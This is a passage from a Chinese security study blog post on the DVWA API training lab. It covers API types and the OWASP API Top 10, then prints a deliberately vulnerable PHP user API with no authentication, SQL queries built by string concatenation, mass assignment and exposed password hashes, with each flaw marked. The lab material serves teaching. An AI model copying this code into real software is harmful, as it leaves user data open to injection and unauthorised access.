<!DOCTYPE html>
<html lang="en,zh-CN,default">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
  <script src="/undefined/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="tia的学习笔记">
<meta property="og:url" content="http://caixuya.github.io/index.html">
<meta property="og:site_name" content="tia的学习笔记">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="caixuya">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://caixuya.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>tia的学习笔记</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">tia的学习笔记</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-主页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-目录">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>

  </li>
        <li class="menu-item menu-item-站点地图">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>

  </li>
        <li class="menu-item menu-item-关于我">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>

  </li>
        <li class="menu-item menu-item-开往">

    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>

  </li>
        <li class="menu-item menu-item-给我写信">

    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>

  </li>
        <li class="menu-item menu-item-公益404">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/API_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/API_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - API (应用程序接口) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:22:49" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>25 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是API安全漏洞？"><a href="#什么是API安全漏洞？" class="headerlink" title="什么是API安全漏洞？"></a>什么是API安全漏洞？</h3><p>API（Application Programming Interface）安全漏洞是指RESTful API、GraphQL API、SOAP API等接口中存在的安全问题，可能导致数据泄露、未授权访问或系统被攻击。</p>
<p><strong>API的类型：</strong></p>
<h3 id="1-REST-API"><a href="#1-REST-API" class="headerlink" title="1. REST API"></a>1. REST API</h3><p>使用HTTP方法操作资源：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET    <span class="regexp">/api/u</span>sers/<span class="number">123</span>      <span class="comment"># 获取用户</span></span><br><span class="line">POST   <span class="regexp">/api/u</span>sers          <span class="comment"># 创建用户</span></span><br><span class="line">PUT    <span class="regexp">/api/u</span>sers/<span class="number">123</span>      <span class="comment"># 更新用户</span></span><br><span class="line">DELETE <span class="regexp">/api/u</span>sers/<span class="number">123</span>      <span class="comment"># 删除用户</span></span><br></pre></td></tr></table></figure>

<h3 id="2-GraphQL-API"><a href="#2-GraphQL-API" class="headerlink" title="2. GraphQL API"></a>2. GraphQL API</h3><p>使用查询语言获取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  user(id: 123) &#123;</span><br><span class="line">    name</span><br><span class="line">    email</span><br><span class="line">    posts &#123;</span><br><span class="line">      title</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-SOAP-API"><a href="#3-SOAP-API" class="headerlink" title="3. SOAP API"></a>3. SOAP API</h3><p>基于XML的协议：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">GetUser</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">UserId</span>&gt;</span>123<span class="tag">&lt;/<span class="name">UserId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">GetUser</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>OWASP API Security Top 10 (2023)：</strong></p>
<table>
<thead>
<tr>
<th>排名</th>
<th>漏洞</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>API1</td>
<td>对象级别授权失效</td>
<td>访问他人数据</td>
</tr>
<tr>
<td>API2</td>
<td>认证机制失效</td>
<td>弱认证</td>
</tr>
<tr>
<td>API3</td>
<td>对象属性级别授权失效</td>
<td>修改敏感字段</td>
</tr>
<tr>
<td>API4</td>
<td>资源消耗无限制</td>
<td>DoS攻击</td>
</tr>
<tr>
<td>API5</td>
<td>功能级别授权失效</td>
<td>越权操作</td>
</tr>
<tr>
<td>API6</td>
<td>批量赋值</td>
<td>修改额外字段</td>
</tr>
<tr>
<td>API7</td>
<td>配置错误</td>
<td>暴露敏感信息</td>
</tr>
<tr>
<td>API8</td>
<td>注入攻击</td>
<td>SQL&#x2F;NoSQL注入</td>
</tr>
<tr>
<td>API9</td>
<td>资产管理不当</td>
<td>旧版本API</td>
</tr>
<tr>
<td>API10</td>
<td>API日志和监控不足</td>
<td>无法检测攻击</td>
</tr>
</tbody></table>
<p><strong>危害：</strong></p>
<ul>
<li>数据泄露</li>
<li>未授权访问</li>
<li>账户接管</li>
<li>DoS攻击</li>
<li>业务逻辑绕过</li>
</ul>
<p><strong>DVWA场景：</strong><br>一个用户管理的REST API，提供CRUD操作。</p>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全不验证权限，任何人都可以访问和修改任何数据。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Low难度：完全没有认证和授权 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置JSON响应头</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取HTTP方法</span></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取请求路径</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作1：不检查认证 ★★★</span></span><br><span class="line"><span class="comment">// 任何人都可以访问API</span></span><br><span class="line"><span class="comment">// 没有API密钥、Token或其他认证机制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作2：不检查授权 ★★★</span></span><br><span class="line"><span class="comment">// 没有验证用户是否有权限操作数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：GET /api/users - 获取所有用户</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="variable">$path</span> == <span class="string">&#x27;/users&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：返回所有用户信息，包括敏感数据 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$users</span> = [];</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 问题：返回密码哈希 ★★★</span></span><br><span class="line">        <span class="variable">$users</span>[] = <span class="variable">$row</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$users</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：GET /api/users/&#123;id&#125; - 获取单个用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：不检查是否有权查看该用户 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$row</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：POST /api/users - 创建用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$path</span> == <span class="string">&#x27;/users&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何人都可以创建用户 ★★★</span></span><br><span class="line">    <span class="comment">// 没有限流，可以创建大量垃圾账户</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$input</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：直接拼接SQL，存在SQL注入 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users (user, password, email) VALUES (&#x27;<span class="subst">$username</span>&#x27;, &#x27;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) . <span class="string">&quot;&#x27;, &#x27;<span class="subst">$email</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User created&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to create user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：PUT /api/users/&#123;id&#125; - 更新用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何人都可以修改任何用户 ★★★</span></span><br><span class="line">    <span class="comment">// 没有验证是否是用户本人或管理员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：批量赋值漏洞 ★★★</span></span><br><span class="line">    <span class="comment">// 可以修改任意字段，包括role、is_admin等</span></span><br><span class="line">    <span class="variable">$fields</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 问题：直接拼接，SQL注入 ★★★</span></span><br><span class="line">        <span class="variable">$fields</span>[] = <span class="string">&quot;<span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$fields</span>) . <span class="string">&quot; WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：DELETE /api/users/&#123;id&#125; - 删除用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;DELETE&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何人都可以删除任何用户 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;DELETE FROM users WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User deleted&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to delete user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 404</span></span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>无认证</strong> - 任何人都可以访问</li>
